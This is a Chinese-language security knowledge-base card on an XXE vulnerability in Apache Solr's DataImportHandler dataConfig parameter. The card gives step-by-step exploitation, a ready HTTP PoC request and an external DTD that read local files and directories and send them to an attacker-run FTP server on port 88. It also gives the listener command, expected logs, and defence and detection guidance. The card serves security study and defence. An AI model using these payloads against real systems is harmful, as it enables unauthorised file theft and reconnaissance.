---
id: web-java-component-solr-dataimport-dataconfig-xxe-ftp-oob
title: Apache Solr DataImportHandler dataConfig XXE：FTP OOB 外带读取文件与目录
type: scenario
domain: web
path: web/java/component
technique: solr-dataimport-dataconfig-xxe-ftp-oob
tags:
- solr
- java
- xxe
- dataimport
- ftp
- oob
- file-read
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V603
  verified_at: '2026-11-12T18:23:48+08:00'
  notes: 已对照原文通读并逐张核对 14/14 图（SolrDispatchFilter.handleAdminRequest、RequestHandlerBase、DataImportHandler handleRequestBody 无论 debug 都走 runCmd、maybeReloadConfiguration/loadDataConfig、DocumentBuilder 未禁外部实体、gopher 不支持、http 异常与 Tomcat 日志目录泄露、Data Config problem try/catch、ftp_xxe.xml、FtpServer.py 0.0.0.0:88、FTP 日志 anonymous 登录与 CWD 目录外带均与图文一致）。修正 CVE 表述：原文未标注 CVE 与版本；“与 CVE-2017-12629 中 DataImportHandler dataConfig 外部实体问题对应”不准确——公开的 CVE-2017-12629 XXE 走 {!xmlparser} 查询解析器，已改为同属 Solr 旧版 XML 解析未禁外部实体、sink 不同并明确本卡入口（staging 草稿同步修改）；affected_versions 仍留空（原文仅称“全版本”，非明确版本区间）。未验证点：未本地复跑；FTP 外带依赖目标出网。dedup：与 solr-dumprequesthandler-file-read、solr-cve-2017-12629 链、generic-xxe-java-ftp-oob 等入口/sink 不同，非同链，保留。
url: /docs/web/java/component/web-java-component-solr-dataimport-dataconfig-xxe-ftp-oob/
draft: false
kb_aliases:
- Solr XXE
- DataImportHandler XXE
- dataConfig 外部实体
- Solr 目录读取
- FTP OOB XXE
- loadDataConfig DocumentBuilder
---

## 一句话结论

Apache Solr 的 DataImportHandler 在处理 `POST /<core>/dataimport` 的 `dataConfig` 参数时，`DataImporter.loadDataConfig` 用未禁用外部实体的 `DocumentBuilderFactory/DocumentBuilder` 解析攻击者提供的 XML，可用 `file://` 参数实体读取目标文件/目录，再把内容拼进 `ftp://` 参数实体由 Solr 发起出站请求，攻击者 FTP 服务日志即可带出内容（目录名会出现在 CWD 路径中）。

## 原理

- **入口与 sink**：`SolrDispatchFilter.doFilter → handleAdminRequest → RequestHandlerBase.handleRequest → DataImportHandler.handleRequestBody → DataImporter.maybeReloadConfiguration → loadDataConfig`。`dataConfig` 请求参数直接作为 `InputSource` 交给 `DocumentBuilder.parse()`。
- **为什么能 XXE**：`loadDataConfig` 中 `DocumentBuilderFactory.newInstance().newDocumentBuilder()` 后只设置了 `setEntityResolver(SystemIdResolver)` 和 `setErrorHandler`，没有设置 `disallow-doctype-decl`、`external-general-entities=false` 等安全特性，DOCTYPE 声明与外部参数实体都会被解析器处理。
- **OOB 外带技巧**：直接把文件内容作为外部实体回显到错误信息不可靠（内容含换行/空格会触发 `URISyntaxException`，异常把 `config` 置空并中断）。改用两段参数实体：
  1. `%a` 用 `file://` 读取目标文件或目录，其内容成为实体值；
  2. `%b` 定义新的参数实体 `%c`，其 SYSTEM 值为 `ftp://attacker:88/%a;/`——`%a;` 展开后把读取到的内容拼进 FTP URL 的路径；
  3. 触发 `%c;`，Solr 向攻击者 FTP 发起请求，路径中带有文件/目录内容，FTP 服务端日志（登录/CWD/命令）即记录。
- **为什么用目录而不是文件**：目录内容（文件名列表）通常只含字母数字与换行，拼进 FTP 路径后可读；读取单个文件时若内容含空格/特殊字符会使 URL 非法而失败。因此该手法最稳定的产出是目录列表（可逐目录枚举），文件读取需处理特殊字符或改用其他协议/过滤器。
- **协议差异（原文实测）**：`gopher://` 不被解析器支持；`http://` 能发请求，但响应内容含换行导致 `URISyntaxException`，连接被断开（不过 Tomcat 日志里已能看到目录内容片段）；`ftp://` 拼接目录内容后稳定外带成功。
- 该入口与 CVE-2017-12629 同属 Solr 旧版 XML 解析未禁用外部实体的问题，但 sink 不同（公开的 CVE-2017-12629 XXE 走 `{!xmlparser}` 查询解析器，本卡是 DataImportHandler 的 `dataConfig`）；原文未标注 CVE 与版本区间，仅称“全版本”。

## 触发条件

- Solr 实例启用 DataImportHandler（`/dataimport` 接口存在，core 名可枚举，如默认示例 `test1`）。
- `/solr/<core>/dataimport` 可从攻击者网络访问且未启用认证。
- 目标 JVM 的 XML 解析器允许 DOCTYPE/外部实体（原文环境默认允许）。
- 目标可出站访问攻击者 FTP 服务（或被诱导访问内网目标做探测）。

## 利用步骤

1. 枚举 core 与接口：访问 `/solr/` 或常见 core 名，确认 `/<core>/dataimport` 返回 DataImportHandler 响应。
2. 在攻击机准备 FTP 服务（原文用 pyftpdlib 的 `FtpServer.py`，监听 `0.0.0.0:88`）。
3. 构造 XXE 配置 `ftp_xxe.xml`：
   ```xml
   <!ENTITY % a SYSTEM "file:///C:/Windows/System32/drivers/etc">
   <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'ftp://attacker:88/%a;/'>">
   %b;
   %c;
   ```
4. 向 `/test1/dataimport` 发送 POST，`dataConfig` 参数放入上述 XML（整体 URL 编码），同时带上 `command=full-import&wt=json&indent=true&verbose=false&clean=false&commit=false&optimize=false`。
5. 观察 FTP 服务日志：出现匿名登录与 `CWD /opt/.../<目录内容>`，即目录已外带；更换 `file://` 路径逐目录/逐文件枚举。
6. 收到 `Data Config problem` 的 500 响应属正常现象——外带发生在解析阶段，响应报错不影响数据已进入 FTP 日志。

## PoC

```http
POST /test1/dataimport HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 281

command=full-import&wt=json&indent=true&verbose=false&clean=false&commit=false&optimize=false&dataConfig=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+root+%5B%3C!ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2Fattacker%2Fftp_xxe.xml%22%3E%25remote%3B%5D%3E
```

`ftp_xxe.xml`（攻击者 HTTP/FTP 文件服务）：

```xml
<!ENTITY % a SYSTEM "file:///C:/Windows/System32/drivers/etc">
<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'ftp://attacker:88/%a;/'>">
%b;
%c;
```

攻击机 FTP 服务（pyftpdlib）：

```bash
python -m pyftpdlib -p 88 -d /tmp
# 或原文的 FtpServer.py：starting FTP server on 0.0.0.0:88
```

预期（原文实测）：FTP 日志出现 `[anonymous] USER 'anonymous' logged in` 与 `CWD /opt/webftp/data/hosts`，即目标目录内容已被拼入 FTP 路径外带；`lmhosts`、`networks`、`protocol`、`services` 等目录项可在日志/错误信息中还原。

## 变体与关联

- 变体：`file://` 直接读具体文件；若文件内容含空格/换行导致 URL 失败，可换用其他外带协议或在目标允许时用错误回显读取。
- 变体：`http://` 外部实体读取内网 URL/端口做 SSRF 探测；响应内容可能通过异常日志泄露。
- 关联：[[web-java-component-solr-cve-2017-12629-xxe-runexecutablelistener-rce]]（同一产品的 `{!xmlparser}` XXE + Config API + RunExecutableListener 升级为 RCE 的另一条链，sink 不同）；[[web-generic-xxe-inband-file-read-default-insecure]]、[[web-generic-xxe-reflected-xml-ssrf-internal-service]]（XXE 基础与 SSRF 组合）。
- 边界：Solr 升级并修复 DataImportHandler XXE；`/dataimport` 加认证/禁用；解析器禁用 DOCTYPE 与外部实体；目标无出网或被出站防火墙阻断时 FTP/HTTP 外带失败。

## 检测与防御

- 升级 Solr 到修复版本（DataImportHandler XXE 已在后续版本修复），删除或禁用示例配置与不必要的 DataImportHandler。
- 为 `/solr` 管理/导入接口启用认证与访问控制，不向公网暴露。
- XML 解析加固：`factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，或禁用外部通用/参数实体、设置 `ACCESS_EXTERNAL_DTD/SCHEMA` 为空。
- 出站管控：限制 Solr 出网（尤其 FTP 21/88、非业务端口），DNS/HTTP 出网加白名单。
- 检测：请求 `dataConfig` 中出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`ftp://`；Solr 进程发起异常 FTP/HTTP 连接；WAF 对 `/dataimport` 的 XML 参数做实体检查。
